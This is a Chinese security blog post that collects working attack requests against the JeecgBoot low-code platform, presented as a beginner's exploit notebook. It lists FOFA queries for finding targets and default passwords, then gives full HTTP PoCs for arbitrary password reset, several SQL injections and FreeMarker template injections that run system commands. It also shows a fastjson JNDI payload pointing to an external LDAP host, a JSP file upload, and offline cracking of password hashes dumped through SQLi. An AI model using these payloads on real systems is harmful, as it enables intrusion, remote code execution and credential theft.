> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzI4MjkxNzY1NQ==&mid=2247486299&idx=1&sn=3b0933c297885d6e78d8e0b8ec2a5f3b

#  Jeecg-boot常见漏洞汇总  
稻草人  玄武盾网络技术实验室   2025-07-06 23:58  
  
“  
对我们感兴趣的话就点个关注吧  
”  
  
  
   
  
免责声明：本文仅供安全研究与学习之用，严禁用于非法用途，违者后果自负。  
## 前言  
  
jeecg-boot漏洞笔记记录一下。  
  
小白可以直接收藏下来学习一下很多poc我都直接给出来了，基本就是我的笔记。  
  
如果，有不对的可以指正一下，一起学习。  
## jeecg-boot介绍  
  
      JeecgBoot是一款集成AI应用的，基于BPM流程的低代码平台，旨在帮助企业快速实现低代码开发和构建个性化AI应用！前后端分离架构Ant Design&Vue3，SpringBoot，SpringCloud Alibaba，Mybatis-plus，Shiro。强大的代码生成器让前后端代码一键生成，无需写任何代码！ 引领AI低代码开发模式: AI生成->OnlineCoding-> 代码生成-> 手工MERGE， 帮助Java项目解决80%的重复工作，让开发更多关注业务，提高效率、节省成本，同时又不失灵活性！低代码能力：Online表单、表单设计、流程设计、Online报表、大屏/仪表盘设计、报表设计; AI应用平台功能：AI知识库问答、AI模型管理、AI流程编排、AI聊天等，支持含ChatGPT、DeepSeek、Ollama等多种AI大模型。  

```
官网地址：
https://jeecg.com
开源项目地址：
https://github.com/zhangdaiscott/jeecg-boot
```

  
![1751073890_685f446203ce33ac739d0.png!small](https://mmbiz.qpic.cn/mmbiz_jpg/UM0M1icqlo0lzsgIxl5SSvGeiccQU9JkpgmdOzODsWvBI18aYBloX0qzp0ZseQDjwC5P7cOAYoZdLeuxgSh7YwdA/640?wx_fmt=jpeg&from=appmsg "")  
## 资产测绘  
> fofa:  
> body="/sys/common/pdf/pdfPreviewIframe"  
  
title="Jeecg-Boot 快速开发平台" || body="积木报表"  
  
body="jeecg-boot"  
  
app="JEECG"  
  
icon_hash="1380908726"  
  
icon_hash="-250963920"  
  
  
![1751074165_685f457555c409dcd6741.png!small?1751074165285](https://mmbiz.qpic.cn/mmbiz_jpg/UM0M1icqlo0lzsgIxl5SSvGeiccQU9JkpgOtiaOQPib9tYmiaHMB1MOAXMlwlLWdOic9AbozrQIxqakz5KXVYRsN1e1g/640?wx_fmt=jpeg&from=appmsg "")  
## 常见情况  
  
加载动画  
  
![1751074465_685f46a153dfa564857d2.png!small?1751074465213](https://mmbiz.qpic.cn/mmbiz_jpg/UM0M1icqlo0lzsgIxl5SSvGeiccQU9JkpgKemicibwNdgEr56jzxxrU2ORWQWS9y55fbZH1xJxywDldhP37kWWc4JQ/640?wx_fmt=jpeg&from=appmsg "")  
  
![1751074352_685f463098ada0ee7f739.png!small?1751074352654](https://mmbiz.qpic.cn/mmbiz_jpg/UM0M1icqlo0lzsgIxl5SSvGeiccQU9JkpguDDJZfP4zjE0z4SaBENVPKy9cjWbANTlfPFn3AlVjbCGTA8fhX2QUQ/640?wx_fmt=jpeg&from=appmsg "")  
  
![1751074496_685f46c03fc59e5f87987.png!small?1751074496168](https://mmbiz.qpic.cn/mmbiz_jpg/UM0M1icqlo0lzsgIxl5SSvGeiccQU9JkpgYPWRlktjUU1J3E1uibEMf5WeUZUM6CJWQX6eyXkmr1QXWw5PT2Zlglg/640?wx_fmt=jpeg&from=appmsg "")  
  
出现以下这几种情况基本可以确定是jeecg-boot,也可以通过接口或者图标等信息进行判定。  
## 常见弱口令漏洞  
> admin/123456  
> jeecg/123456  
> admn/admin  
> test/test  
> demo/test  
> jeecg/jeecg123456  
> guest/guest  
  
  
![1751076190_685f4d5e730f2eaae1882.png!small?1751076190863](https://mmbiz.qpic.cn/mmbiz_jpg/UM0M1icqlo0lzsgIxl5SSvGeiccQU9Jkpgex54C8n4mOPViayxXiaBQfTorWEvdKa9WTllvGGKWw05EV8Svscu098A/640?wx_fmt=jpeg&from=appmsg "")  
## JeecgBoot passwordChange接口任意用户密码重置  

```
GET /jeecg-boot/sys/user/passwordChange?username=admin&password=admin&smscode=&phone= HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

  
## jeecg-boot-checkOnlyUser信息泄露漏洞  
> /jeecg-boot/sys/user/querySysUser?username=admin  
>   
> Jeecg-Boot 2.4.5及之前版本存在不安全权限漏洞。攻击者可利用该漏洞通过uri:/sys/user/checkOnlyUser?username=admin提升权限并查看敏感信息。  
  
## jeecg-boot-目录遍历漏洞  
> /jeecg-boot/online/cgform/head/fileTree?_t=1632524014&parentPath=/  
>   
> 低权限账号访问直接返回服务器文件目录信息  
  
## Jeecg-boot 3.4.4 /sys/dict/queryTableData SQL注入  

```
在Jeecg-boot 3.4.4中曾发现分类为致命的漏洞。 此漏洞会影响未知代码文件/sys/dict/queryTableData。 手动调试的不合法输入可导致 SQL注入。
POST /jeecg-boot/jmreport/qurestSql HTTP/1.1
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.29 Safari/525.13
Content-Type: application/json; charset=utf-8
Content-Length: 127
Host: 
Connection: close
Accept-Encoding: gzip, deflate
{&#34;apiSelectId&#34;:&#34;1316997232402231298&#34;,&#34;id&#34;:&#34;1' or '%1%' like (updatexml(0x3a,concat(1,(select md5(123456))),1)) or '%%' like '&#34;}
```

  
## JeecgBoot onlDragDatasetHead/getTotalData SQL注入  

```
JeecgBoot v3.7.1 通过组件 /onlDragDatasetHead/getTotalData 存在 SQL 注入漏洞。
POST /jeecg-boot/drag/onlDragDatasetHead/getTotalData HTTP/2
Host: 
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
Content-Type: application/json
Content-Length: 281
{&#34;tableName&#34;:&#34;sys_user&#34;,&#34;compName&#34;:&#34;test&#34;,&#34;condition&#34;:{&#34;filter&#34;:{}},&#34;config&#34;:{&#34;assistValue&#34;:[],&#34;assistType&#34;:[],&#34;name&#34;:[{&#34;fieldName&#34;:&#34;concat(0x7e,version(),0x7e)&#34;,&#34;fieldType&#34;:&#34;string&#34;},{&#34;fieldName&#34;:&#34;id&#34;,&#34;fieldType&#34;:&#34;string&#34;}],&#34;value&#34;:[{&#34;fieldName&#34;:&#34;id&#34;,&#34;fieldType&#34;:&#34;1&#34;}],&#34;type&#34;:[]}}
```

  
## jeecg-boot-getDictItemsByTable SQL注入漏洞  
  
JeecgBoot是一款基于代码生成器的低代码开发平台，它专为简化Java项目开发流程、提高开发效率而设计。攻击者通过注入恶意的SQL代码，能够窃取、篡改或删除数据库中的数据，甚至执行系统命令，对网站和服务器造成严重影响。  
  

```
GET /jeecg-boot/sys/ng-alain/getDictItemsByTable/'%20from%20sys_user/*,%20'/x.js HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Sec-Purpose: prefetch
Connection: close
Priority: u=6
```

  
## Jeecg-Boot /jmreport/show SQL注入漏洞  

```
jeecg-boot 3.5.0和3.5.1 版本存在安全漏洞，该漏洞源于 /jeecg-boot/jmreport/show 接口的 id 参数存在SQL注入漏洞。
POST /jeecg-boot/jmreport/show HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36
Connection: close
Content-Length: 182
Content-Type: application/json;charset=UTF-8
Accept-Encoding: gzip
{
&#34;id&#34;: &#34;961455b47c0b86dc961e90b5893bff05&#34;,
&#34;apiUrl&#34;: &#34;&#34;,
&#34;params&#34;: {
&#34;id &#34;: &#34;1 ' or ' % 1 % ' like (updatexml(0x3a,concat(1,(version())),1)) or ' % % ' like '&#34;
}
}
```

  
## jeecg-boot sys/duplicate/check SQL注入  

```
/sys/duplicate/check 接口SQL注入，checksql可以被绕过，该漏洞需要进行身份认证。
GET /jeecg-boot/sys/duplicate/check?tableName=v3_hello&fieldName=1+and%09if(user(%20)='root@localhost',sleep(0),sleep(0))&fieldVal=1&dataId=asd HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36
Connection: close
Cache-Control: max-age=0
X_ACCESS_TOKEN: eyJ0eXAi0iJKV1QiLCJhbGci0iJIUzI1Ni J9.eyJleHAi0jE2NzA2NjUy0TQsInVzZXJ uYW1lIjoiYWRtaW4i fQ.bL0e7k3rbFEewdMoL2YfPCo9rtzx7g9 KLjB2LK-J9SU
GET /jeecg-boot/sys/duplicate/check?tableName=sys_log&fieldName=1+and%09if(user(%20)='root@localhost',sleep(0),sleep(10))&fieldVal=1000&dataId=2000 HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36
Connection: close
Cache-Control: max-age=0
X_ACCESS_TOKEN: eyJ0eXAi0iJKV1QiLCJhbGci0iJIUzI1Ni J9.eyJleHAi0jE2NzA2NjUy0TQsInVzZXJ uYW1lIjoiYWRtaW4i fQ.bL0e7k3rbFEewdMoL2YfPCo9rtzx7g9 KLjB2LK-J9SU
```

  
## JeecgBoot jmreport/loadTableData SSTI模板注入漏洞  

```
jeecg-boot 版本 3.5.3 中的 SSTI 注入漏洞允许远程攻击者通过对 /jmreport/loadTableData 组件进行精心设计的 HTTP 请求执行任意代码。
POST /jeecg-boot/jmreport/loadTableData HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=UTF-8
X-Sign: AD0488642A880C68C8E3551C3BE0F6F5
X-TIMESTAMP: 1699726206096
X-Access-Token: null
token: null
JmReport-Tenant-Id: null
Content-Length: 167
Connection: close
Cookie: Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=1699726144; Hm_lpvt_5819d05c0869771ff6e6a81cdec5b2e8=1699726162
{&#34;dbSource&#34;:&#34;&#34;,&#34;sql&#34;:&#34;select '<#assign value=\&#34;freemarker.template.utility.Execute\&#34;?new()>${value(\&#34;whoami\&#34;)}'&#34;,&#34;tableName&#34;:&#34;test_demo);&#34;,&#34;pageNo&#34;:1,&#34;pageSize&#34;:10}
```

  
## JeecgBoot AviatorScript表达式注入  

```
积木报表软件存在AviatorScript代码注入RCE漏洞。使用接口/jmreport/save处在text中写入AviatorScript表达式。访问/jmreport/show触发AviatorScript解析从而导致命令执行。
POST /jeecg-boot/jmreport/queryFieldBySql?previousPage=xxx&jmLink=YWFhfHxiYmI=&token=123 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json, text/plain, */*
Content-Type: application/json
Content-Length: 108
{&#34;sql&#34;:&#34;select 'result:<#assign ex=\&#34;freemarker.template.utility.Execute\&#34;?new()> ${ex(\&#34;whoami \&#34;) }'&#34; 
}
```

  
## jeecg-boot后台/sysMessageTemplate/sendMsg接口freemaker模板注入  

```
jeecg-boot的Freemarker模板注入导致远程命令执行, 远程攻击者可利用该漏洞调用在系统上执行任意命令。
1、添加一个测试模板
POST /jeecg-boot/sys/message/sysMessageTemplate/add HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MzYyMTcyNDQsInVzZXJuYW1lIjoiYWRtaW4ifQ.-Z6FINUMTWQkOR6u009cde9BFyb-l65VWRhUXDz_2ao
Tenant-Id: 0
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
Priority: u=0
Te: trailers
Connection: close
Content-Type: application/json;charset=UTF-8
Content-Length: 141
{&#34;templateType&#34;:&#34;1&#34;,&#34;templateCode&#34;:&#34;5&#34;,&#34;templateName&#34;:&#34;test111&#34;,&#34;templateContent&#34;:&#34;${\&#34;freemarker.template.utility.Execute\&#34;?new()(\&#34;id\&#34;)}&#34;}
2、发送模板
POST /jeecg-boot/sys/message/sysMessageTemplate/sendMsg HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MzYyMTcyNDQsInVzZXJuYW1lIjoiYWRtaW4ifQ.-Z6FINUMTWQkOR6u009cde9BFyb-l65VWRhUXDz_2ao
Tenant-Id: 0
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
Priority: u=0
Te: trailers
Connection: close
Content-Type: application/json;charset=UTF-8
Content-Length: 64
{&#34;templateCode&#34;:&#34;5&#34;,&#34;testData&#34;:&#34;{}&#34;,&#34;receiver&#34;:&#34;&#34;,&#34;msgType&#34;:&#34;1&#34;}
3、执行模板并查看返回结果
GET /jeecg-boot/sys/message/sysMessage/list?_t=1732776144&column=createTime&order=desc&field=id,,,esTitle,esContent,esReceiver,esSendNum,esSendStatus_dictText,esSendTime,esType_dictText,action&pageNo=1&pageSize=10 HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MzYyMTcyNDQsInVzZXJuYW1lIjoiYWRtaW4ifQ.-Z6FINUMTWQkOR6u009cde9BFyb-l65VWRhUXDz_2ao
Tenant-Id: 0
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
Priority: u=0
Te: trailers
Connection: close
Accept-Encoding: gzip
```

  
## Jeecg-jeecgFormDemoController存在JNDI代码执行漏洞  

```
JEECG 4.0 及之前版本中，由于 /api 接口鉴权时未过滤路径遍历，攻击 者可构造包含 ../ 的 url 绕过鉴权。 因为依赖 1.2.31 版本的 fastjson， 该版本存在反序列化漏洞。攻击者可对
/api/../jeecgFormDemoController.do?interfaceTest 接口进行 jndi 注入攻 击实现远程代码执行。
POST /api/../jeecgFormDemoController.do?interfaceTest= HTTP/1.1
Host: 
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
cmd: whoami
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 77
serverUrl=http://xxxxxxxx:8877/jeecg.txt&requestBody=1&requestMethod=GET
创建如下远程文件，其内容为fastjson代码执行的payload
{
&#34;a&#34;:{
&#34;@type&#34;:&#34;java.lang.Class&#34;,
&#34;val&#34;:&#34;com.sun.rowset.JdbcRowSetImpl&#34;
},
&#34;b&#34;:{
&#34;@type&#34;:&#34;com.sun.rowset.JdbcRowSetImpl&#34;,
&#34;dataSourceName&#34;:&#34;ldap://10.66.64.89:1389/8orsiq&#34;,
&#34;autoCommit&#34;:true
}
}
```

  
## jeecg-boot/jmreport/upload接口存在未授权任意文件上传  

```
测试发现/jeecg-boot/jmreport/upload接口存在未授权任意文件上传，经实测发现上传接口未授权，但访问上传后的文件需要登录，即带token。
POST /jeecg-boot/jmreport/upload HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; http://www.baidu.com/search/spider.html)
Accept: */*
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryyfyhSCMs9cajzFD4
Cache-Control: no-cache
Pragma: no-cache
Host: 
Content-Length: 1476
------WebKitFormBoundaryyfyhSCMs9cajzFD4
Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;11111.txt&#34;
Content-Type: text/html
<%! 1111>
------WebKitFormBoundaryyfyhSCMs9cajzFD4
Content-Disposition: form-data; name=&#34;fileName&#34;
11111.txt
------WebKitFormBoundaryyfyhSCMs9cajzFD4
Content-Disposition: form-data; name=&#34;biz&#34;
excel_online
------WebKitFormBoundaryyfyhSCMs9cajzFD4--
```

  
## Jeecg-commonController.do文件上传  

```
由于 /api 接口鉴权时未过滤路径遍历，攻击者可构造包含 ../ 的url绕过鉴权。攻击者可构造恶意请求利用 commonController 接口进行文件上传攻击实现远程代码执行。
POST /jeecg-boot/api/../commonController.do?parserXml HTTP/1.1
Host:
Accept-Encoding: gzip, deflate
Content-Length: 360
User-Agent: Mozilla/2.0 (compatible; MSIE 3.01; Windows 95
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygcflwtei
Connection: close
------WebKitFormBoundarygcflwtei
Content-Disposition: form-data; &#34;name=&#34;name&#34;
zW9YCa.png
------WebKitFormBoundarygcflwtei
ontent-Disposition: form-data; name=&#34;documentTitle&#34;
blank
------WebKitFormBoundarygcflwtei
Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;zW9YCa.jsp&#34;
Content-Type: image/png
11111
------WebKitFormBoundarygcflwtei--
```

  
## 常见jeecg-boot常见接口  

```
/v2/api-docs
/jeecg-boot/online/cgform/head/fileTree?_t=1632524014&parentPath=/
/jeecg-boot/sys/user/querySysUser?username=admin
/jeecg/
/api/sys/
/sys/user
/v2/api-docs
/swagger-ui.html
/env
/actuator
/mappings
/metrics
/beans
/configprops
/actuator/metrics
/actuator/mappings
/actuator/beans
/actuator/configprops
/actuator/httptrace
/druid/index.html
/druid/sql.html
/druid/weburi.html
/druid/websession.html
/druid/weburi.json
/druid/websession.json
/druid/login.html
/api/config/list
/sys/user/list
/sys/user/add
/sys/user/edit
/sys/user/queryById
/sys/user/changePassword
/sys/role/list
/sys/role/add
/sys/role/edit
/sys/role/queryPermission
/v2/api-docs
/v1/api-docs
/api-docs
/sys/menu/list
/sys/menu/add
/sys/menu/edit
/sys/menu/delete
/sys/depart/list
/sys/depart/add
/sys/depart/edit
/sys/depart/delete
/online/cgform/list
/online/cgform/add
/online/cgform/edit
/online/cgform/delete
/online/cgform/fields/{tableName}
/online/cgform/table/list
/online/cgform/table/sync
/online/cgform/generateCode
/sys/dict/list
/sys/dict/add
/sys/dict/edit
/sys/dict/delete
/act/process/list
/act/process/deploy
/act/task/list
/act/task/complete
/act/task/history
/sys/common/upload
/sys/common/download/{fileId}
/sys/common/view/{fileId}
/monitor/redis/info
/monitor/server/info
/api/test/demo/list
/api/test/demo/add
/sys/log/list
/sys/log/delete
/sys/sms/send
/sys/sms/list
/api/test/demo/edit
/api/test/demo/delete
/report/loadReport/{code}
/chart/api/getChartData
/api/test/demo/queryById
/act/process/delete
/sys/dict/loadDictItems/{dictCode}
/jeecg-boot/sys/getLoginQrcode
/jeecg-boot/sys/getQrcodeToken
/jeecg-boot/sys/login
/jeecg-boot/sys/phoneLogin
/jeecg-boot/sys/scanLoginQrcode
/jeecg-boot/drag/onlDragDataSource/add
/jeecg-boot/drag/onlDragDataSource/delete
/jeecg-boot/drag/onlDragDataSource/deleteBatch
/jeecg-boot/drag/onlDragDataSource/edit
/jeecg-boot/drag/onlDragDataSource/list
/jeecg-boot/drag/onlDragDataSource/queryById
/jeecg-boot/drag/onlDragDatasetHead/add
/jeecg-boot/drag/onlDragDatasetHead/addGroup
/jeecg-boot/drag/onlDragDatasetHead/delDragDataSetHeadGroup
/jeecg-boot/drag/onlDragDatasetHead/delete
/jeecg-boot/drag/onlDragDatasetHead/edit
/jeecg-boot/drag/onlDragDatasetHead/queryById
/jeecg-boot/drag/onlDragDatasetHead/updateGroup
/jeecg-boot/drag/onlDragDatasetParam/add
/jeecg-boot/drag/onlDragDatasetParam/delete
/jeecg-boot/druid/login.html
/jeecg-boot/drag/onlDragDatasetParam/deleteBatch
/jeecg-boot/drag/onlDragDatasetParam/edit
/jeecg-boot/actuator/httptrace
/jeecg-boot/drag/onlDragDatasetParam/list
/jeecg-boot/drag/onlDragDatasetParam/queryById
/jeecg-boot/drag/websocket/sendData
/jeecg-boot/sys/checkRule/add
/jeecg-boot/sys/checkRule/checkByCode
/jeecg-boot/sys/checkRule/delete
/jeecg-boot/sys/checkRule/deleteBatch
/jeecg-boot/sys/checkRule/edit
/jeecg-boot/sys/checkRule/list
/jeecg-boot/sys/checkRule/queryById
/jeecg-boot/sys/comment/add
/jeecg-boot/sys/comment/addFile
/jeecg-boot/sys/comment/addText
/jeecg-boot/sys/comment/delete
/jeecg-boot/sys/comment/deleteBatch
/jeecg-boot/sys/comment/deleteOne
/jeecg-boot/sys/comment/edit
/jeecg-boot/sys/comment/fileList
/jeecg-boot/sys/comment/list
/jeecg-boot/sys/comment/listByForm
/jeecg-boot/sys/comment/queryById
/jeecg-boot/sys/dataSource/add
/jeecg-boot/sys/dataSource/delete
/jeecg-boot/sys/dataSource/deleteBatch
/jeecg-boot/sys/dataSource/edit
/jeecg-boot/sys/dataSource/list
/jeecg-boot/sys/dataSource/queryById
/jeecg-boot/sys/dictItem/dictItemCheck
/jeecg-boot/sys/duplicate/check
/jeecg-boot/sys/files/add
/jeecg-boot/sys/files/delete
/jeecg-boot/sys/files/deleteBatch
/jeecg-boot/sys/files/edit
/jeecg-boot/sys/files/list
/jeecg-boot/sys/files/queryById
/jeecg-boot/sys/fillRule/add
/jeecg-boot/sys/fillRule/delete
/jeecg-boot/sys/fillRule/deleteBatch
/jeecg-boot/sys/fillRule/edit
/jeecg-boot/sys/fillRule/list
/jeecg-boot/sys/fillRule/queryById
/jeecg-boot/sys/formFile/add
/jeecg-boot/sys/formFile/delete
/jeecg-boot/sys/formFile/deleteBatch
/jeecg-boot/sys/formFile/edit
/jeecg-boot/sys/formFile/list
/jeecg-boot/sys/formFile/queryById
/jeecg-boot/sys/position/add
/jeecg-boot/sys/position/delete
/jeecg-boot/sys/position/deleteBatch
/jeecg-boot/sys/position/edit
/jeecg-boot/sys/position/list
/jeecg-boot/sys/position/queryByCode
/jeecg-boot/sys/position/queryById
/jeecg-boot/sys/quartzJob/pause
/jeecg-boot/sys/quartzJob/resume
/jeecg-boot/sys/randomImage/
/jeecg-boot/sys/sysDepartPermission/add
/jeecg-boot/sys/sysDepartPermission/delete
/jeecg-boot/sys/sysDepartPermission/deleteBatch
/jeecg-boot/sys/sysDepartPermission/edit
/jeecg-boot/sys/sysDepartPermission/list
/jeecg-boot/sys/sysDepartPermission/queryById
/jeecg-boot/sys/sysDepartRole/add
/jeecg-boot/sys/sysDepartRole/delete
/jeecg-boot/sys/sysDepartRole/deleteBatch
/jeecg-boot/sys/sysDepartRole/edit
/jeecg-boot/sys/sysDepartRole/list
/jeecg-boot/sys/sysDepartRole/queryById
/jeecg-boot/sys/sysRoleIndex/add
/jeecg-boot/sys/sysRoleIndex/delete
/jeecg-boot/sys/sysRoleIndex/deleteBatch
/jeecg-boot/sys/sysRoleIndex/edit
/jeecg-boot/sys/sysRoleIndex/list
/jeecg-boot/sys/sysRoleIndex/queryByCode
/jeecg-boot/sys/sysRoleIndex/queryById
/jeecg-boot/test/dynamic/test1
/jeecg-boot/test/jeecgDemo/add
/jeecg-boot/test/jeecgDemo/delete
/jeecg-boot/test/jeecgDemo/deleteBatch
/jeecg-boot/test/jeecgDemo/edit
/jeecg-boot/test/jeecgDemo/list
/jeecg-boot/test/jeecgDemo/queryById
/sys/user/delete
/jeecg-boot/sys/user/addSysUserRole
/sys/role/delete
/user/register
```

## 常见jeecg-boot漏洞利用工具  

```
https://github.com/Framework-vulnerability-tool/jeecg
工具介绍
jeecg综合漏洞利用工具,程序采用javafx开发,环境JDK 1.8 声明：仅用于授权测试，用户滥用造成的一切后果和作者无关 请遵守法律法规！ 漏洞收录如下：
jeecg-boot queryFieldBySql远程命令执行漏洞
jeecg-boot testConnection远程命令执行漏洞
JeecgBoot jmreport/loadTableData SSTI模板注入漏洞
jeecg-boot-queryTableData-sqli注入漏洞
jeecg-boot-getDictItemsByTable-sqli注入漏洞
Jeecg-Boot qurestSql-SQL注入漏洞
jeecg-boot commonController 任意文件上传漏洞
jeecg-boot jmreport任意文件上传漏洞
jeecg-boot-querySysUser信息泄露漏洞
jeecg-boot-checkOnlyUser信息泄露漏洞
jeecg-boot-httptrace信息泄露漏洞
jeecg-boot-任意文件下载漏洞
jeecg-boot-jeecgFormDemoController漏洞
jeecg-boot-v2 P3 Biz Chat任意文件读取漏洞
jeecg-boot-v2 sys/duplicate/check注入漏洞
jeecg-boot-v2 AviatorScript表达式注入漏洞
```

  
  
![1751075977_685f4c89a3ddfff507016.png!small?1751075977796](https://mmbiz.qpic.cn/mmbiz_jpg/UM0M1icqlo0lzsgIxl5SSvGeiccQU9JkpgIOOMbRFjsA1eCVVbwWyFValeC73wmyNot78ylRZSZia4nqTVaZImqEg/640?wx_fmt=jpeg&from=appmsg "")  
  
有时候我们检测到了sql注入漏洞但是无法getshell，可以另辟蹊径，直接读取密码文件然后进行解密。  
> https://github.com/ssrsec/JeecgBoot-offline-brute  
> 有sqli的端点，但是无法rce以及进一步获得权限，我们可以尝试通过sqli获取凭据从而获得用户级权限  
> 数据库中
```
password
```

  
字段是加密的，通过查看源码发现密码使用PBE进行加密，关键是用明文密码作为对称加密key的一个环节，所以没办法直接逆向解密，但是可以离线爆破。  
  
  
![1751076706_685f4f62e6a2fbd3ea825.png!small?1751076707181](https://mmbiz.qpic.cn/mmbiz_jpg/UM0M1icqlo0lzsgIxl5SSvGeiccQU9JkpgAUczfl8G1HdEYT2kibu6dj5sgW3DiaA296zPjRdgGs2R3g92JSxGUADQ/640?wx_fmt=jpeg&from=appmsg "")  
  
![1751076790_685f4fb6870fcd503d064.png!small?1751076791078](https://mmbiz.qpic.cn/mmbiz_jpg/UM0M1icqlo0lzsgIxl5SSvGeiccQU9JkpgvwTShEZV7viaZYajLiaPOH89jYDwG8a8ibURXwiblUv0ZW0jU6yLibpkKHA/640?wx_fmt=jpeg&from=appmsg "")  
  
![1751076815_685f4fcf627fac22a8605.png!small?1751076815671](https://mmbiz.qpic.cn/mmbiz_jpg/UM0M1icqlo0lzsgIxl5SSvGeiccQU9Jkpgj5sQdHFEm93AQBLricq83ibhy33lVkibMIOUAQM8Mq310fQxNVux9B1gQ/640?wx_fmt=jpeg&from=appmsg "")  
  
实现过程  
  
过程非常简单，直接捞出加密过程，然后通过sqli将数据库中的
```
用户名
```

  
、
```
加密后的密码
```

  
、
```
salt
```

  
取出来，然后直接用字典跑就行～  
  
先取出对应的数据，放到根目录下的
```
data.json
```

  
，然后准备一个字典，放到根目录下的
```
pass.txt
```

  
  
![1751076917_685f5035d5ee244d2f0d3.png!small?1751076918516](https://mmbiz.qpic.cn/mmbiz_jpg/UM0M1icqlo0lzsgIxl5SSvGeiccQU9JkpgIcBoSElOwkQNtNJTBNVAjsHVjEuibS2iaUibr4UWVk6x80BaMicmJD6qyA/640?wx_fmt=jpeg&from=appmsg "")  
  
![1751076938_685f504a3096e14cc57a7.png!small?1751076938439](https://mmbiz.qpic.cn/mmbiz_jpg/UM0M1icqlo0lzsgIxl5SSvGeiccQU9Jkpgf08P9qv78FWKicME0wrtVCodmIyCibaULQ09icLfNc9EMZndCkLV3JfUQ/640?wx_fmt=jpeg&from=appmsg "")  

```
java -jar JeecgBoot-offline-brute.jar
```

  
![1751077062_685f50c6bdf487fa91563.png!small?1751077063418](https://mmbiz.qpic.cn/mmbiz_jpg/UM0M1icqlo0lzsgIxl5SSvGeiccQU9JkpgjxDhASepBTGB07XLXZC1gYeK4I5bJBDJzH1VwhI1yyODbnOEWiaB8Tg/640?wx_fmt=jpeg&from=appmsg "")  
  
  
  
为爱发电，随手点个「推荐」吧！  
  
